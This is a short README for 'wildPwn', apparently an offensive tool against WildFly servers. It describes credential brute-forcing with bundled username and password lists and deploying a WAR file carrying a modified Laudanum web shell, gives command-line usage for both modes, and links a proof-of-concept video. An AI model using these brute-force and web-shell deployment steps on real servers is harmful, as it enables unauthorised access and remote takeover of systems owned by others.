# wildPwn - WildFly Exploitation Tool
Its a simple tool for WildFly. Tool can be used to brute force or shell deploy. *wildPwn.war* contains modified Laudanum Shell. *userList.txt* contains common usernames and *passList.txt* contains common passwords.

# Usage
Bruteforce
```
python wildPwn.py -m brute --target <TARGET> -user <USERNAME LIST> -pass <PASSWORD LIST> 
```

Deploy
```
python wildPwn.py -m deploy --target <TARGET> --port <PORT> -u <USERNAME> -p <PASSWORD>
```

# Video
[![PoC Video](https://i.ytimg.com/vi/kTsPwA7QhLU/maxresdefault.jpg)](https://www.youtube.com/watch?v=kTsPwA7QhLU)
